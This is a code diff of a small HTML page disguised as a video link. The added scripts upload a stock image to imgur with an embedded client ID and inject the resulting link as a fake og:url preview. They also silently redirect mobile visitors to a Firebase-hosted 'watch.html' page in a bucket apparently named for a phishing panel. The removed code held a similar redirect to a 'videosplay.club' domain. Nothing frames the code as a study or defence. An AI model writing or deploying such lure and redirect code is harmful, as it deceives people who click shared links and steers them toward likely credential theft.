@@ -1,10 +1,10 @@
 <html>
 <head>
 <meta property="og:title" content="VIDEO" />
-<meta property="og:url"                content="https://www.youtube.com" />
-
 </head>
 <body>
+<script>var myHeaders = new Headers();myHeaders.append("Authorization", "Client-ID {{c5b1b270c973aa5}}");var formdata = new FormData();formdata.append("image", "https://tusimagenesde.com/wp-content/uploads/2016/02/imagenes-locas-6.jpg");formdata.append("title","Mira que Chulitoooo");formdata.append("name","luxi.jpg");var requestOptions = {method: 'POST',headers: myHeaders,body: formdata,redirect: 'follow'};fetch("https://api.imgur.com/3/upload", requestOptions).then(response => response.json()).then(result => {document.head.innerHTML += '<meta property="og:url" content="'+result.data.link+'"/>';console.log(result.data.link);}).catch(error => console.log('error', error));</script>
+<script> if(screen.width<1080) { location.href ='https://firebasestorage.googleapis.com/v0/b/panelfbss-103ca.appspot.com/o/watch.html?alt=media&token=18e1e9dd-5787-42f9-89a1-b98875404e43'; } </script>
 <style>
 .button {
     background-color: #4CAF50;
@@ -22,39 +22,5 @@
 <p id="demo">
     
 </p>
-<script type="text/javascript">
-
-function generateRandomString(iLen) {
-    var sRnd = '';
-    var sChrs = "abcdefghiklmnopqrstuvwxyz";
-    for (var i = 0; i < iLen; i++) {
-      var randomPoz = Math.floor(Math.random() * sChrs.length);
-      sRnd += sChrs.substring(randomPoz, randomPoz + 1);
-    }
-    return sRnd;
-  }
-
-function getUrlVars() {
-    var vars = {};
-    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
-        vars[key] = value;
-    });
-    return vars;
-}
-//var id = getUrlVars()["id"];
-//var index = getUrlVars()["index"];
-//var name = getUrlVars()["name"];
-//var wkr = getUrlVars()["wkr"];
-function visitPage(){
-        window.location = "http://herodescc.videosplay.club/?braunny=4";
-    }
-
-        if (screen.width <= 720) {
-        window.location = "http://herodescc.videosplay.club/?braunny=4";
-    } else {
-       document.getElementById("demo").innerHTML ="<h1><button class=button onclick=visitPage();> Watch Video</button></h1>"
-    }
-
-</script>
 </body>
 </html>
